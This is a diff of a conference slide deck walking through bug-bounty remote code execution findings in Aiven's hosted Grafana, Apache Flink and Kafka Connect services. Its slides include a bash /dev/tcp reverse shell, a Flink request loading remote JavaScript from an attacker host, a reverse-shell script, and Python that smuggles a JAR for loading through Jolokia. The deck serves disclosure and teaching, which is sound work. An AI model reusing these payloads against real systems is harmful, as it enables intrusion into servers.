@@ -170,8 +170,10 @@ protocol = http
 # Grafana RCE (5) - Q1
 
 - Testing for CRLF injection (\r\n) AKA newline injection
-- <b>API input validation schema in Github:</b>
-    - github.com/aiven/terraform-provider-aiven/aiven/templates/service_user_config_schema.json
+- Searched Aiven Github repositories in case something interesting was there
+- <b>Found Service Configuration API input validation schema in Github [^1]</b>
+
+[^1]: https://github.com/aiven/terraform-provider-aiven/blob/v2.1.9/aiven/templates/service_user_config_schema.json
 
 <BarBottom title="hackerone.com/reports/1200647">
   <Item text="@JJaaskela">
@@ -296,20 +298,8 @@ SMTP server parameters missing regex validation. CRLF injection possible!!!
 
 # Grafana RCE (x)
 
-- How to establish reverse shell?
-- Bash supports /dev/tcp/SERVER_IP/SERVER_PORT - bash opens tcp connection to SERVER_IP:SERVER_PORT
-- Bash reverse shell: `bash -l > /dev/tcp/SERVER_IP/4444 0<&1 2>&1`
-
-<BarBottom title="hackerone.com/reports/1200647">
-  <Item text="@JJaaskela">
-    <carbon:logo-twitter />
-  </Item>
-</BarBottom>
-
----
-
-# Grafana RCE (x)
-
+- Verified that it works on local Grafana instance
+- How to establish reverse shell:
 ```txt
 [plugin.grafana-image-renderer]
 rendering_args=--renderer-cmd-prefix=bash -c bash -l > /dev/tcp/SERVER_IP/4444 0<&1 2>&1
@@ -325,7 +315,8 @@ rendering_args=--renderer-cmd-prefix=bash -c bash -l > /dev/tcp/SERVER_IP/4444 0
 
 # Grafana RCE (9)
 
-- For some reason, could not pass whitespaces, had to encode spaces using "$IFS"
+- For some reason, could not pass white spaces, had to encode spaces using "$IFS"
+- IFS env variable - Internal Field Seperator - can be used as space substitute
 
 ```txt
 [plugin.grafana-image-renderer]
@@ -383,10 +374,42 @@ Content-Type: application/json
 
 ---
 
-# Apache Flink RCE (1)
+# Apache Flink RCE
 
-- Apache Flink has REST API
-- Aiven blocked access to some REST API endpoints via reverse proxy rules (HAProxy)
+- Flink processes data from database, kafka or some other data source
+- User can submit jobs that process data - these are java applications (JAR files) that contain user code
+- Flink has Web UI and REST API
+
+<BarBottom title="hackerone.com/reports/1418891">
+  <Item text="@JJaaskela">
+    <carbon:logo-twitter />
+  </Item>
+</BarBottom>
+
+
+---
+
+# Apache Flink RCE
+
+- Aiven Flink Service does not allow running custom jobs
+- Only SQL queries
+- Web UI and REST API are accessible
+
+<BarBottom title="hackerone.com/reports/1418891">
+  <Item text="@JJaaskela">
+    <carbon:logo-twitter />
+  </Item>
+</BarBottom>
+
+
+---
+
+# Apache Flink RCE
+
+- Aiven blocked access to some REST API endpoints via reverse proxy rules (like uploading JAR files)
+
+<img src="src/../img/flink-web-ui.png" style="height: 350px"/>
+
 - However, all GET operations were still allowed
 
 
@@ -405,7 +428,6 @@ Apache Flink Rest API documentation:
 <img src="img/flink-plan-get.png"/>
 
 - Can specify java class name and class arguments !?! 🤔
-- Potential RCE using GET request!?! What!!!
 
 
 <BarBottom title="hackerone.com/reports/1418891">
@@ -418,7 +440,26 @@ Apache Flink Rest API documentation:
 
 # Apache Flink RCE
 
-- Finding the gadget ... TODO
+- Reviewed Flink source code to confirm how it works
+- Found that calls `main(String[])` method of the entry-class with the programArg values:
+
+```java
+private static void callMainMethod(Class<?> entryClass, String[] args) throws ProgramInvocationException {
+    Method mainMethod;
+    if (!Modifier.isPublic(entryClass.getModifiers())) {
+        throw new ProgramInvocationException(
+                "The class " + entryClass.getName() + " must be public.");
+    }
+    try {
+        mainMethod = entryClass.getMethod("main", String[].class);
+    } catch (NoSuchMethodException e) {
+        throw new ProgramInvocationException(
+                "The class " + entryClass.getName() + " has no main(String[]) method.");
+    } catch (Throwable t) {
+        // [...]
+    }
+}
+```
 
 <BarBottom title="hackerone.com/reports/1418891">
   <Item text="@JJaaskela">
@@ -430,7 +471,12 @@ Apache Flink Rest API documentation:
 
 # Apache Flink RCE
 
-- GET <https://FLINK_INSTANCE_NAME.aivencloud.com/plan?entry-class=com.sun.tools.script.shell.Main&programArg=-e,load(https://evil.example.org)&parallelism=1>
+- How this can be used to execute arbitrary code on the Flink server?
+- Searching Java JDK for "main(String[]":
+
+<img src="img/search-code.png" style="height: 250px"/>
+
+- Found com.sun.tools.script.shell tool - same as the jrunscript command line tool
 
 <BarBottom title="hackerone.com/reports/1418891">
   <Item text="@JJaaskela">
@@ -442,11 +488,68 @@ Apache Flink Rest API documentation:
 
 # Apache Flink RCE
 
+<img src="img/jrunscript-1.png"/>
+
+<img src="img/jrunscript-2.png"/>
+
 <BarBottom title="hackerone.com/reports/1418891">
   <Item text="@JJaaskela">
     <carbon:logo-twitter />
   </Item>
-</BarBottom>  
+</BarBottom>
+
+---
+
+# Apache Flink RCE
+
+- jrunscript uses Nashorn JavaScript engine
+- To make delivering reverse shell payload easier, why not load it from remote JavaScript file?
+
+<img src="img/jrunscript-3.png"/>
+
+<BarBottom title="hackerone.com/reports/1418891">
+  <Item text="@JJaaskela">
+    <carbon:logo-twitter />
+  </Item>
+</BarBottom>
+
+---
+
+# Apache Flink RCE
+
+
+- shell.js: [^1]
+
+```js
+var host = "https://evil.example.org";
+var port = 8888;
+var cmd = "/bin/bash";
+
+var p = new java.lang.ProcessBuilder(cmd, "-i").redirectErrorStream(true) // [...]
+```
+
+[^1]: https://gist.github.com/frohoff/8e7c2bf3737032a25051
+
+<BarBottom title="hackerone.com/reports/1418891">
+  <Item text="@JJaaskela">
+    <carbon:logo-twitter />
+  </Item>
+</BarBottom>
+
+```http
+GET /jars/145df7ff-c71a-4f3a-b77a-ee4055b1bede_a.jar/plan
+?entry-class=com.sun.tools.script.shell.Main&programArg=-e,load("https://fs.bugbounty.jarijaas.fi/aiven-flink/shell-loader.js")
+&parallelism=1 HTTP/1.1
+Host: ████
+Authorization: Basic █████
+```
+
+<BarBottom title="hackerone.com/reports/1418891">
+  <Item text="@JJaaskela">
+    <carbon:logo-twitter />
+  </Item>
+</BarBottom>
+
 
 ---
 
@@ -460,14 +563,263 @@ Apache Flink Rest API documentation:
   </Item>
 </BarBottom>
 
----
+<!--
+# Apache Flink RCE
 
-# Apache Flink RCE - Fun fact
-
-- 🤔 GET /jars/:jarId/:plan was silently removed in Flink 1.16 (28 Oct 2022) release 🧐
+- GET /jars/:jarId/plan was removed in Flink 1.16 (28 Oct 2022) release
 
 <BarBottom title="hackerone.com/reports/1418891">
   <Item text="@JJaaskela">
     <carbon:logo-twitter />
+  </Item>
+</BarBottom>
+-->
+
+---
+
+# Kafka Connect RCE
+
+- Tool for streaming data between Kafka and other data systems
+- Streaming implemented using connectors
+- Supports 3rd party connectors
+- Connectors configurable via REST API
+- Sink Connector = sends data from Kafka to the sink data system
+- Source Connector = retrieves data from the source data system to Kafka
+
+<BarBottom title="hackerone.com/reports/1547877">
+  <Item text="@JJaaskela">
+    <carbon:logo-twitter />
+  </Item>
+</BarBottom>
+
+---
+
+# Kafka Connect RCE
+
+- Aiven supports interesting connectors, such as [^1]:
+
+| Connector |  |
+|--------| -------  |
+| JDBC Sink Connector       | Connect to database using JDBC driver |
+| HTTP Sink       | Send data using HTTP request |
+|        |
+
+[^1]: https://docs.aiven.io/docs/products/kafka/kafka-connect/howto.html
+
+<BarBottom title="hackerone.com/reports/1547877">
+  <Item text="@JJaaskela">
+    <carbon:logo-twitter />
+  </Item>
+</BarBottom>
+
+---
+
+
+
+ # Kafka Connect RCE
+
+- Found out that Jolokia is listening on localhost via logs
+- Jolokia is a HTTP bridge to JMX (Java Management Extension)
+
+<img src="img/kafka-connect-logs.png"/>
+
+<BarBottom title="hackerone.com/reports/1547877">
+  <Item text="@JJaaskela">
+    <carbon:logo-twitter />
+  </Item>
+</BarBottom>
+
+---
+
+ # Kafka Connect RCE
+
+- HTTP sink connector does not check if destination is localhost -> can send HTTP POST requests to Jolokia
+- Can we use Jolokia to gain RCE?
+
+<BarBottom title="hackerone.com/reports/1547877">
+  <Item text="@JJaaskela">
+    <carbon:logo-twitter />
+  </Item>
+</BarBottom>
+
+---
+
+# Kafka Connect RCE
+
+- Jolokia exposes the following command:
+```json
+"jvmtiAgentLoad": {
+    "args": [{
+        "name": "arguments",
+        "type": "[Ljava.lang.String;",
+        "desc": "Array of Diagnostic Commands Arguments and Options"
+    }],
+    "ret": "java.lang.String",
+    "desc": "Load JVMTI native agent."
+}
+```
+
+- Can use this to load JAR files from the disk
+
+<BarBottom title="hackerone.com/reports/1547877">
+  <Item text="@JJaaskela">
+    <carbon:logo-twitter />
+  </Item>
+</BarBottom>
+
+---
+
+# Kafka Connect RCE
+
+- <b>How can we upload JAR file to the server?</b>
+
+<BarBottom title="hackerone.com/reports/1547877">
+  <Item text="@JJaaskela">
+    <carbon:logo-twitter />
+  </Item>
+</BarBottom>
+
+---
+
+# Kafka Connect RCE - What is a JAR file
+
+- ZIP file that contains the compiled java application code
+- JAR parsers, like ZIP parsers do not care if the JAR is inside another file format (just looks for file header signature: PK...)
+- <b>Can embed JAR files inside another file format</b>
+
+<BarBottom title="hackerone.com/reports/1547877">
+  <Item text="@JJaaskela">
+    <carbon:logo-twitter />
+  </Item>
+</BarBottom>
+
+---
+
+# Kafka Connect RCE - SQLite JDBC Driver
+
+- Bundled with Aiven JDBC sink connector
+- SQLite database files are stored locally, can specify database filepath via connection url
+
+Connection URL:
+```text
+jdbc:sqlite:/tmp/test.db
+```
+
+<BarBottom title="hackerone.com/reports/1547877">
+  <Item text="@JJaaskela">
+    <carbon:logo-twitter />
+  </Item>
+</BarBottom>
+
+---
+
+# Kafka Connect RCE
+
+- Use JDBC sink connector and the SQLite JDBC driver to create db file
+- Create database table for the JAR and insert the JAR contents
+- Load the file as JAR using Jolokia jvmtiAgentLoad command
+
+<BarBottom title="hackerone.com/reports/1547877">
+  <Item text="@JJaaskela">
+    <carbon:logo-twitter />
+  </Item>
+</BarBottom>
+
+---
+
+ # Kafka Connect RCE - JDBC SQLite config
+
+ ```python
+connector_url = f"{kafka_connect_api_baseurl}/connectors/{connector_name}"
+
+payload = json.dumps({
+  "connector.class": "io.aiven.connect.jdbc.JdbcSinkConnector",
+  "connection.url": f"jdbc:sqlite:/tmp/test.db",
+  "name":connector_name,
+  "topics": topic_name,
+  "key.converter": "org.apache.kafka.connect.storage.StringConverter",
+  "value.converter": "org.apache.kafka.connect.json.JsonConverter",
+  "value.converter.schemas.enable": "true",
+  "auto.create": "true" # Create tables automatically
+})
+headers = {
+    'Content-Type': 'application/json'
+}
+requests.request("PUT", f"{connector_url}/config", headers=headers, data=payload, auth=(kafka_user, kafka_password))
+ ```
+
+ <BarBottom title="hackerone.com/reports/1547877">
+  <Item text="@JJaaskela">
+    <carbon:logo-twitter />
+  </Item>
+</BarBottom>
+
+---
+
+# Kafka Connect RCE - JDBC SQLite Kafka topic message
+
+ ```python
+producer.send(topic_name, json.dumps(
+  {
+  "schema": {
+      "type": "struct",
+      "fields": [{
+          "field": "payload",
+          "type": "bytes",
+          "optional": False
+      }]
+  },
+  "payload": {
+      # JsonConverter uses com.fasterxml.jackson, which supports binary values as base64 encoded string
+      "payload": base64.b64encode(jar_contents).decode('utf-8') 
+  }
+  }
+).encode('utf-8'))
+ ```
+
+<BarBottom title="hackerone.com/reports/1547877">
+  <Item text="@JJaaskela">
+    <carbon:logo-twitter />
+  </Item>
+</BarBottom>
+
+---
+
+ # Kafka Connect RCE
+
+<video>
+<source src="videos/kafka-connec-jdbc-jolokia.mp4" type="video/mp4">
+</video>
+
+<BarBottom title="hackerone.com/reports/1547877">
+  <Item text="@JJaaskela">
+    <carbon:logo-twitter />
+  </Item>
+</BarBottom>
+
+---
+
+ # Kafka Connect RCE
+
+ ![](img/kafka-connect-bounty.png)
+
+<BarBottom title="hackerone.com/reports/1547877">
+  <Item text="@JJaaskela">
+    <carbon:logo-twitter />
+  </Item>
+</BarBottom>
+
+---
+
+# That's it
+
+- Any questions?
+
+<BarBottom title="Thank you!">
+  <Item text="@JJaaskela">
+    <carbon:logo-twitter />
+  </Item>
+  <Item text="jarijaas">
+    <carbon:logo-linkedin />
   </Item>
 </BarBottom>
